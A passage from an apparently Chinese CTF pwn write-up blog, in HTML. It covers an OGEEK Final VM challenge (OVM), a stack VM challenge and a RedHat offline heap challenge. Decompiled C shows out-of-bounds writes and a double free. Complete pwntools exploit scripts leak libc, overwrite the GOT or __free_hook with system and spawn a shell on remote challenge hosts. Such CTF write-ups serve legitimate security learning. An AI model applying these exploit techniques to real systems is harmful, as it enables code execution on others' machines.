load</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">50L</span>L:</span><br><span class="line">        v5 = Save(output1);                     <span class="comment">// save</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>因为写博客的时候距离做题过去了很久函数什么的已经弄不太清了所以函数就不怎么细讲了，这里直接看产生漏洞的函数，res是我们可控的输入数据，这里没有检查，因此可以越界写数据。基本思路是越界写把<code>output</code>的<code>node</code>的<code>chunk_addr</code>改成<code>puts@got</code>，再计算system和puts的实际地址，将差值通过<code>add</code>加回去，最终push回去，从而hijack got表地址，在puts程序名的时候执行system函数。这个题困扰我的是调整栈平衡Blabla总之简单的exp写了很久。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">Save</span><span class="params">(node *output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 res; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)MyPop(output, &amp;res) || !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)MyPop(output, &amp;v3) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)(<span class="number">8</span> * (output-&gt;idx + res) + output-&gt;chunk_addr) = v3;<span class="comment">// 越界</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20173</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    gdb.attach(p,<span class="string">'b* 0x401d98'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Your program name:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Your instruction:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"push push push save push push pop add push"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Your stack data:"</span>)</span><br><span class="line">    payload = <span class="string">"1 "</span>+str(elf.got[<span class="string">'puts'</span>]) + <span class="string">" "</span> + str(<span class="number">-4</span>) + <span class="string">" "</span> + str(<span class="number">0x7f3838d52390</span><span class="number">-0x7f3838d7c690</span>) +<span class="string">" "</span>+ <span class="string">"1 "</span>*<span class="number">5</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="OGEEK-Final-OVM"><a href="#OGEEK-Final-OVM" class="headerlink" title="OGEEK Final OVM"></a>OGEEK Final OVM</h2><h3 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h3><p>是OGEEK线下决赛的一道vmpwn，bss上分配了一块区域放寄存器，其中<code>reg[13]</code>为<code>sp</code>，<code>reg[15]</code>为<code>pc</code>寄存器。execute将输入数据(四字节)分成1234四个字节，最高字节表示<code>commnd</code>，之后是reg[three]和reg[two]以及reg[one]的运算，其中有输出寄存器内容的地方。</p>
<p>在choice分别为0x60和0x70的时候没有检查值的范围导致越界读写，我们可以通过sub等功能输入负数进去从而存储got表的值到reg里最终泄露出Libc地址，需要注意的是我们操作的单位都是4字节，因此我们需要泄露两组reg，之后通过add或者sub加上offset得到<code>__free_hook-8</code>的地址写到<code>comment[0]</code>，read的时候输入”/bin/sh\x00+system_addr”最后sendmsg会free(comment[0])即可get shell。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int16 code_size; <span class="comment">// [rsp+2h] [rbp-Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 pc; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 _sp; <span class="comment">// [rsp+6h] [rbp-Ah]</span></span><br><span class="line">  <span class="keyword">int</span> a1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  comment[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x8C</span>uLL);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  signal(<span class="number">2</span>, (<span class="keyword">__sighandler_t</span>)signal_handler);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"WELCOME TO OVM PWN\n"</span>, <span class="number">0x16</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"PC: "</span>, <span class="number">4u</span>LL);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%hd"</span>, &amp;pc);</span><br><span class="line">  getchar();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"SP: "</span>, <span class="number">4u</span>LL);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%hd"</span>, &amp;_sp);</span><br><span class="line">  getchar();</span><br><span class="line">  reg[<span class="number">13</span>] = _sp;</span><br><span class="line">  reg[<span class="number">15</span>] = pc;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"CODE SIZE: "</span>, <span class="number">0xB</span>uLL);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%hd"</span>, &amp;code_size);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( _sp + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)code_size &gt; <span class="number">0x10000</span> || !code_size )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"EXCEPTION\n"</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">155</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"CODE: "</span>, <span class="number">6u</span>LL);</span><br><span class="line">  running = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; code_size &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(<span class="string">"%d"</span>, &amp;memory[pc + i]);</span><br><span class="line">    <span class="keyword">if</span> ( (memory[i + pc] &amp; <span class="number">0xFF000000</span>) == <span class="number">0xFF000000</span> )</span><br><span class="line">      memory[i + pc] = <span class="number">0xE0000000</span>;</span><br><span class="line">    getchar();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( running )</span><br><span class="line">  &#123;</span><br><span class="line">    a1 = fetch();</span><br><span class="line">    execute(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"HOW DO YOU FEEL AT OVM?\n"</span>, <span class="number">0x1B</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, comment[<span class="number">0</span>], <span class="number">0x8C</span>uLL);</span><br><span class="line">  sendcomment(comment[<span class="number">0</span>]);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Bye\n"</span>, <span class="number">4u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">execute</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 one_byte; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 two_byte; <span class="comment">// [rsp+19h] [rbp-7h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 three_byte; <span class="comment">// [rsp+1Ah] [rbp-6h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  three_byte = (a1 &amp; <span class="number">0xF0000</span>u) &gt;&gt; <span class="number">16</span>;           <span class="comment">// three byte</span></span><br><span class="line">  two_byte = (<span class="keyword">unsigned</span> __int16)(a1 &amp; <span class="number">0xF00</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">  one_byte = a1 &amp; <span class="number">0xF</span>;</span><br><span class="line">  <span class="keyword">if</span> ( HIBYTE(a1) == <span class="number">0x70</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    reg[three_byte] = reg[one_byte] + reg[two_byte];</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)HIBYTE(a1) &gt; <span class="number">0x70</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( HIBYTE(a1) == <span class="number">0xB0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[three_byte] = reg[one_byte] ^ reg[two_byte];</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)HIBYTE(a1) &gt; <span class="number">0xB0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( HIBYTE(a1) == <span class="number">0xD0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        reg[three_byte] = reg[two_byte] &gt;&gt; reg[one_byte];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)HIBYTE(a1) &gt; <span class="number">0xD0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( HIBYTE(a1) == <span class="number">0xE0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          running = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !reg[<span class="number">13</span>] )</span><br><span class="line">          &#123;</span><br><span class="line">            write(<span class="number">1</span>, <span class="string">"EXIT\n"</span>, <span class="number">5u</span>LL);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(a1) != <span class="number">0xFF</span> )          <span class="comment">// 先设置为0xff</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        running = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"R%d: %X\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)reg[i]);</span><br><span class="line">        write(<span class="number">1</span>, <span class="string">"HALT\n"</span>, <span class="number">5u</span>LL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(a1) == <span class="number">0xC0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        reg[three_byte] = reg[two_byte] &lt;&lt; reg[one_byte];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( HIBYTE(a1) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x90</span>u:</span><br><span class="line">          reg[three_byte] = reg[one_byte] &amp; reg[two_byte];</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xA0</span>u:</span><br><span class="line">          reg[three_byte] = reg[one_byte] | reg[two_byte];</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x80</span>u:</span><br><span class="line">          reg[three_byte] = reg[two_byte] - reg[one_byte];</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(a1) == <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    reg[three_byte] = memory[reg[one_byte]];    <span class="comment">// get val</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)HIBYTE(a1) &gt; <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( HIBYTE(a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x50</span>u:</span><br><span class="line">        v1 = reg[<span class="number">13</span>];</span><br><span class="line">        reg[<span class="number">13</span>] = v1 + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">stack</span>[v1] = reg[three_byte];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x60</span>u:</span><br><span class="line">        reg[three_byte] = <span class="built_in">stack</span>[--reg[<span class="number">13</span>]];     <span class="comment">// stack</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x40</span>u:</span><br><span class="line">        memory[reg[one_byte]] = reg[three_byte];<span class="comment">// useful</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(a1) == <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    reg[three_byte] = (<span class="keyword">unsigned</span> __int8)a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(a1) == <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    reg[three_byte] = (_BYTE)a1 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Orphan comments:</span></span><br><span class="line"><span class="comment">add</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./ovm'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./ovm'</span>)</span><br><span class="line">    gadgets = [<span class="number">0x3ac5c</span>,<span class="number">0x3ac5e</span>,<span class="number">0x3ac62</span>,<span class="number">0x3ac69</span>,<span class="number">0x5fbc5</span>,<span class="number">0x5fbc6</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gadgets = [<span class="number">0x3a80c</span>,<span class="number">0x3a80e</span>,<span class="number">0x3a812</span>,<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line">    p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28129</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Splice</span><span class="params">(choice,three_byte,two_byte,one_byte)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str((choice &lt;&lt; <span class="number">24</span>) + (three_byte &lt;&lt; <span class="number">16</span>) + (two_byte &lt;&lt; <span class="number">8</span>) + (one_byte &amp; <span class="number">0xf</span>))</span><br><span class="line"></span><br><span class="line">stack_addr = <span class="number">0x2420a0</span></span><br><span class="line">reg_addr = <span class="number">0x242060</span></span><br><span class="line">memory_add = <span class="number">0x202060</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    p.recvuntil(<span class="string">"PCPC: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"0"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"SP: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"0"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"CODE SIZE: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"18"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"CODE: "</span>)</span><br><span class="line">    write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">    offset = (stack_addr-write_got) / <span class="number">4</span></span><br><span class="line">    off_free_setbuf = libc.sym[<span class="string">'__free_hook'</span>] - libc.sym[<span class="string">'setbuf'</span>] - <span class="number">8</span></span><br><span class="line">    log.info(<span class="string">"[+] offset between free_hook and setbuf is "</span> + hex(off_free_setbuf))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#first set some reg == printf_got_addr</span></span><br><span class="line">    <span class="comment">#second set comment = free_hook - 8</span></span><br><span class="line">    <span class="comment">#trigger the leak</span></span><br><span class="line">    <span class="comment">#one</span></span><br><span class="line">    code = [</span><br><span class="line">            <span class="number">0x10041</span>,</span><br><span class="line">            <span class="number">0x3000000d</span>,</span><br><span class="line">            <span class="number">0x80000100</span>,</span><br><span class="line">            <span class="number">0xa00d0000</span>,</span><br><span class="line">            <span class="number">0x60020000</span>,</span><br><span class="line">            <span class="number">0x60030000</span>,</span><br><span class="line">            <span class="number">0x60040000</span>,</span><br><span class="line">            <span class="number">0x80060f07</span>,<span class="comment">#put 8 to reg[6]</span></span><br><span class="line">            <span class="number">0x60050000</span>,</span><br><span class="line">            <span class="number">0x80070806</span>,<span class="comment">#put -8 to reg[7]</span></span><br><span class="line">            <span class="comment">#set to free_hook-8</span></span><br><span class="line">            <span class="number">0x3008000f</span>,</span><br><span class="line">            off_free_setbuf,</span><br><span class="line">            <span class="number">0x70040408</span>,<span class="comment">#set reg[4] = __free_hook-8</span></span><br><span class="line">            <span class="number">0x40040007</span>,</span><br><span class="line">            <span class="comment">#set reg[13]=reg[7]</span></span><br><span class="line">            <span class="number">0x800d070a</span>,</span><br><span class="line">            <span class="comment">#reg[13]++</span></span><br><span class="line">            <span class="number">0x50000000</span>,</span><br><span class="line">            <span class="number">0x4005000d</span>,</span><br><span class="line">            <span class="number">0xe0000000</span></span><br><span class="line">            <span class="comment">#set to trigger 0xff</span></span><br><span class="line">            ]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">	sleep(<span class="number">0.01</span>)</span><br><span class="line">	p.sendline(str(i))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="comment">#p.recvuntil("R2: ")</span></span><br><span class="line">    <span class="comment">#print res</span></span><br><span class="line">    low = int(p.recvline().strip(<span class="string">'\n'</span>)[<span class="number">4</span>:],<span class="number">16</span>)</span><br><span class="line">    high = int(p.recvline().strip(<span class="string">'\n'</span>)[<span class="number">4</span>:],<span class="number">16</span>)</span><br><span class="line">    libc_base = ((high&lt;&lt;<span class="number">32</span>)+low) - libc.sym[<span class="string">'printf'</span>]</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    p.recvuntil(<span class="string">"HOW DO YOU FEEL AT OVM?"</span>)</span><br><span class="line">    p.sendline(<span class="string">"/bin/sh\x00"</span>+p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="RedHat线下粤湾银行"><a href="#RedHat线下粤湾银行" class="headerlink" title="RedHat线下粤湾银行"></a>RedHat线下粤湾银行</h2><h3 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h3><p>32位程序，new就分配堆空间存储数据，每次分配0x2c的空间来做各种计算，play就取数据分析，free就释放分配的空间，这里有double free。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> node            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x2C</span>, mappedto_7)</span><br><span class="line"><span class="number">00000000</span> idx0            dd ?</span><br><span class="line"><span class="number">00000004</span> idx1            dd ?</span><br><span class="line"><span class="number">00000008</span> idx2            dd ?</span><br><span class="line"><span class="number">0000000</span>C idx3            dd ?</span><br><span class="line"><span class="number">00000010</span> idx4            dd ?</span><br><span class="line"><span class="number">00000014</span> idx5            dd ?</span><br><span class="line"><span class="number">00000018</span> calloc_addr_fc  dd ?</span><br><span class="line"><span class="number">0000001</span>C calloc_addr_fc1 dd ?</span><br><span class="line"><span class="number">00000020</span> malloc_addr     dd ?</span><br><span class="line"><span class="number">00000024</span> idx9            dd ?</span><br><span class="line"><span class="number">00000028</span> calloc_addr     dd ?</span><br><span class="line"><span class="number">0000002</span>C node            ends</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __cdecl __noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// ST1C_4</span></span><br><span class="line">  node *ptr; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  Init();</span><br><span class="line">  ptr = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        choice = menu();</span><br><span class="line">        <span class="keyword">if</span> ( choice != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( ptr )</span><br><span class="line">          play(ptr);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"NOT FOUND!"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( choice &gt; <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      ptr = <span class="keyword">new</span>();</span><br><span class="line">      buf = <span class="built_in">malloc</span>(<span class="number">0x200</span>u);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">0x1FF</span>u);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"gift:%x%x\n"</span>, ptr-&gt;calloc_addr &amp; <span class="number">0xFFF</span>, (<span class="keyword">unsigned</span> __int16)ptr &amp; <span class="number">0xFFF</span>);</span><br><span class="line">      ptr-&gt;malloc_addr = (<span class="keyword">int</span>)buf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice != <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( choice == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"bye!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_18:</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)ptr-&gt;calloc_addr);</span><br><span class="line">      <span class="built_in">free</span>(ptr);                                <span class="comment">// double free</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"NOT FOUND!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>new的node大概如上面所示。play是主要函数。在0x10可以读写idx3，在0x40/0x43处可以越界设置idx3的值，我们设置为put@got之后putchar泄露低位，再使got地址自增1继续泄露，最终泄露得到libc，同理可以用putchar设置free@got的值为system，设置ptr-&gt;idx0为”/bin”，ptr-&gt;idx为”/sh\x00”，最后free的时候触发system(“/bin/sh\x00”)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">node *<span class="title">new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  node *node_addr; <span class="comment">// eax</span></span><br><span class="line">  node *v1; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  node_addr = (node *)<span class="built_in">malloc</span>(<span class="number">0x2C</span>u);</span><br><span class="line">  v1 = node_addr;</span><br><span class="line">  node_addr-&gt;idx0 = <span class="number">0</span>;</span><br><span class="line">  node_addr-&gt;idx1 = <span class="number">0</span>;</span><br><span class="line">  node_addr-&gt;idx2 = <span class="number">0</span>;</span><br><span class="line">  node_addr-&gt;idx3 = <span class="number">0</span>;</span><br><span class="line">  node_addr-&gt;idx4 = <span class="number">0</span>;</span><br><span class="line">  node_addr-&gt;idx5 = <span class="number">0</span>;</span><br><span class="line">  node_addr-&gt;idx9 = <span class="number">0</span>;</span><br><span class="line">  node_addr-&gt;calloc_addr = (<span class="keyword">int</span>)<span class="built_in">calloc</span>(<span class="number">4u</span>, <span class="number">0x40</span>u);</span><br><span class="line">  v1-&gt;calloc_addr_fc = v1-&gt;calloc_addr + <span class="number">0xFC</span>;</span><br><span class="line">  v1-&gt;calloc_addr_fc1 = v1-&gt;calloc_addr + <span class="number">0xFC</span>;</span><br><span class="line">  v1-&gt;malloc_addr = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">node *__cdecl <span class="title">play</span><span class="params">(node *node_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v2; <span class="comment">// ST18_1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// ST1A_1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 